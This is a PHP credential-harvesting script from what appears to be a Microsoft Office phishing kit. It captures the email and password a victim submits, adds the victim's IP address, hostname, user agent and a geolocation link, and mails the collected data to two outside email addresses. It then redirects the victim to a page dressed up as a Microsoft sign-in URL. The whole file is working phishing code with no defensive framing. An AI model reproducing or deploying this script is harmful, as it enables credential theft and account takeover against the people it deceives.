<?php

if($_POST["logn"] != "" and $_POST["passd"] != ""){

$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);

$useragent = $_SERVER['HTTP_USER_AGENT'];

$message .= "|----------------- Microsoft Office Login -----------------|\n";

$message .= "Email          : ".$_POST['logn']."\n";

$message .= "Password       : ".$_POST['passd']."\n";

$message .= "|--------------------- I N F O | I P ----------------------|\n";

$message .= "|Client IP: ".$ip."\n";

$message .= "|--------- http://www.geoiptool.com/?IP=$ip ---------|\n";

$message .= "User Agent : ".$useragent."\n";

$message .= "|---------------------- A-29 Online -----------------------|\n";

$send = "wrking370@gmail.com,c.joe95@protonmail.com";

$subject = "Microsoft by A-29 Online | $ip";

{

mail("$send", "$subject", $message);   

}

$praga=rand();

$praga=md5($praga);

  header ("Location: Finish.php?wa=wsignin1.0&rpsnv=13&ct=1504448382&rver=6.7.6643.0&wp=MBI_SSL_SHARED&wreply=https%2F%2Fmail.live.com%2Fdefault.aspx%3Frru%3Dinbox&lc=1033&id=64855&mkt=en-us&cbcxt=mai");

}else{

header ("Location: index.php");

}



?>